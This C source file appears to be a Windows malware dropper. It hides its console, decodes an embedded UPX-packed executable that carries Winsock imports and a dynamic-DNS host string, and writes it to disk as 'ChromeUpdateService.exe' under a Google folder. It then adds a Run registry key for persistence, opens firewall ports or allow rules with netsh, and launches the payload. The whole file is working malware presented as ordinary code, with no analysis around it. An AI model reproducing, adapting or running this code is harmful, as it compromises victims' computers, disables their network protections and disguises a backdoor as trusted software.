#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <stdio.h>
#include <process.h>
int hex_to_int();
int hex_to_ascii();
const char* hex="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300000000000000000000000000E0000F030B01060000100000001000000030000010440000004000000050000000004000001000000002000004000000000000000400000000000000006000000010000000000000030000000000100000100000000010000010000000000000100000000000000000000000005000003801000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000300000001000000000000000020000000000000000000000000000800000E0555058310000000000100000004000000006000000020000000000000000000000000000400000E0555058320000000000100000005000000002000000080000000000000000000000000000400000C0332E393100555058210D090208F964A2C549BE72215F220000ED030000000C00002600003F7FB7DFFC5589E581EC00908B450850E807046C0474B801E6D81F73130F7C83C404C9C327D40187FCFD7E1384B93251502A8CB80094FC2FEC3783C01E8945FC138B4DFC39C80F8D02EE7E7BDBEBE51A20400022F8B8EC1F0007F4B802B1F67FEB176608EA8D8558FEFFFF500FB70A3916C0CCF69C83F80034139160F7C3DA6C134119A489854043CDCCB7588B053EFF0F850F0E32D6DEB6201004FF8D7B2CAC5EC8C8C8545400E3FEFFB09F4D1DC00C8B080A0A0FBF10528BB1ED3BDB0150AF484AB4290C8560ED76B6665344D681E00695CEF636DDBC1546B810A736441CD877C3671FC485C00F847B67811D9BECE3043545F0322C2323DBCCBB3C3C0411766B7EED24C78605E90201E95038FC9B1C161FC005B940BB2D5CC259C110A8D482EC1EEC94B020EC08DAFD3BECB9BFE1FBDBED1688080940B994518D8D2251029C9DED2D4CEB380A345E6473230CEC75B03011FC9E6D360FF08376B28B8D1329C819B2D860538B28EC3896B0DFD9418D0B01C84F131D20234C34FD381291CD6D98C717026B922B2CDBD8C57E05FFD0AE1A030DEA0000C8CF48031F2C8D45E8A6E163C22D99BBD4A103652C630D6A001BDC08A737C2DBCCE435D41FC1DC03E92E634DE0E41DEC148B138BB6CDF0A48B00244456D80ED8FF201B907A0000872C24558D6C7F0FDFFD24045189E981BF13CD85012DD93D047DEC29EEE1C6B7C10F89E089CCBDFF60C2C356C77EB3F603E88B0001096603ECBBF481BB97BD2B50C38B65E814FCFF00FA137DFBC31B311214401F0504558B6D088D4424DB26BCDDA70031C0040464A10CF82C236FDFC89B070CB820101D14ED0864A3F94C9F7D205DC7FF2584FE078864904106A8D0DC90410619AC8C904106196494B098061964909CA0D4B419649041B8BCC084994106C4C800FEFF5554636C3334722E64646E732E6E6574ADA2228CFF364755811198D0107FF9FF5F01476574436F6E736F6C6557696E646F77566972747561ED4FB3FD6C416C6C6F6328A5A86578697405B7DBB7F274696D65036D637079075F633A7472F7BFED6E3B66700B5F734A5F6170705F747970650F6FDDB7CB676D6154617267730E5831744669DE7633F76C7465720C4C066365155F68617D9AEDD6797F72336DB0DC5368F634DBAC8A9014BB846391D6DEBDB563AA636B653C575341433439C3DE76EC75700B537467740B1FDCAF7D737D437374627980B26874E5065BF7E642056E65631E72057611FE09797950454C0102E0000F030B0106FB4E7742201308100D400BDBB049373604071730F646B62738CE1003100207A05B365B09574F6448BA01C28F8457600BF65D182E8A78748B0590EE35FF2DEC0223422E6461746180CB857DEF1BFBE8082740C00080D97E1B4421030B0100000000000020FF000000000000000000000000000060BE154040008DBEEBCFFFFF5783CDFFEB109090909090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9240000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE002000008B0709C0743C8B5F048D84300040000001F35083C708FF9664400000958A074708C074DC89F95748F2AE55FF966840000009C07407890383C304EBE1FF96784000008BAE6C4000008DBE00F0FFFFBB0010000050546A045357FFD58D879F01000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E980CDFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009850000064500000000000000000000000000000A550000080500000000000000000000000000000B050000088500000000000000000000000000000BB500000905000000000000000000000000000000000000000000000C6500000D4500000E4500000F45000000251000010510000000000001E51000000000000245100000000000030510000000000004B45524E454C33322E444C4C006D73766372742E646C6C007573657233322E646C6C007773325F33322E646C6C0000004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000004578697450726F6365737300000065786974000053686F7757696E646F7700007265637600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
main(){
 ShowWindow(GetConsoleWindow(), SW_HIDE);
 int length = strlen(hex);
 char buf = 0;
 char* path=getenv("PROGRAMFILES");
 char toopen[1024];
 strcat(toopen, path);
 strcat(toopen, "\\");
 strcat(toopen, "Google");
 mkdir(toopen);
 strcat(toopen, "\\");
 strcat(toopen, "ChromeUpdateService.exe");
 FILE *file = fopen(toopen, "wb");
 for(int i=0;i<length;i++){
 	if(i%2 != 0){
 		fprintf(file, "%c", hex_to_ascii(buf, hex[i]));
 	} else {
 		buf = hex[i];
 	}
 }
 fclose(file);
 char hkcutoexecute[2048]="REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"ChromeService\" /t REG_SZ /d \"";
 strcat(hkcutoexecute, toopen);
 strcat(hkcutoexecute, "\"");
 system(hkcutoexecute);
 char* envvar_temp=getenv("TEMP");
 char txt_path[1024]="";
 strcat(txt_path, envvar_temp);
 strcat(txt_path, "\\config.txt");
 char checkver[1024]="";
 strcat(checkver, "for /f \"tokens=2 delims=\\ \" %a in (\"%USERPROFILE%\") do (echo %a)>");
 strcat(checkver, txt_path);
 system(checkver);
 FILE *txt=fopen(txt_path, "r");
 char winver_output[512]="";
 fgets(winver_output, 80, txt);
 fclose(txt);
 if(strcmp(winver_output,"Documents\n")==0){
  system("netsh firewall add portopening TCP 8172 Chrome");
 } else {
  char addfirewall_out[1024]="netsh advfirewall firewall add rule name=\"Chrome\" dir=out program=\"";
  strcat(addfirewall_out, toopen);
  strcat(addfirewall_out, "\" protocol=tcp action=allow");
  system(addfirewall_out);
  char addfirewall_in[1024]="netsh advfirewall firewall add rule name=\"Chrome\" dir=in program=\"";
  strcat(addfirewall_in, toopen);
  strcat(addfirewall_in, "\" protocol=tcp action=allow");
  system(addfirewall_in);
 }
 spawnl(P_NOWAIT, toopen, toopen, NULL);
 return 0;
}
int hex_to_int(char c){
 int first = c / 16 - 3;
 int second = c % 16;
 int result = first*10 + second;
 if(result > 9) result--;
 return result;
}
int hex_to_ascii(char c, char d){
 int high = hex_to_int(c) * 16;
 int low = hex_to_int(d);
 return high+low;
}
